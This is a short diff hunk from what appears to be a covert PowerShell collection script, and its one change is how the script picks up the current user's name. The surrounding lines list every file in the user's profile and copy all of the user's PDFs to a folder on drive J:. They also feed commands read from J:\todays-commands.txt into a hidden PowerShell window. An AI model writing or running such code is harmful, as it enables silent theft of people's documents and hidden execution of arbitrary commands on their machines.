@@ -31,6 +31,6 @@ cd J: ;
 mkdir $Domain;
 cd $Domain;
 mkdir Uploads;
-Get-ChildItem -Recurse C:\Users\$User > $Storage\Current_File_List.txt;
+Get-ChildItem -Recurse C:\Users\$env:USERNAME > $Storage\Current_File_List.txt;
 Get-Childitem C:\Users\$User -recurse -filter "*.pdf" | %{Copy-Item -Path $_.FullName -Destination $Storage};
 Get-Content J:\todays-commands.txt | powershell.exe -windowstyle hidden;
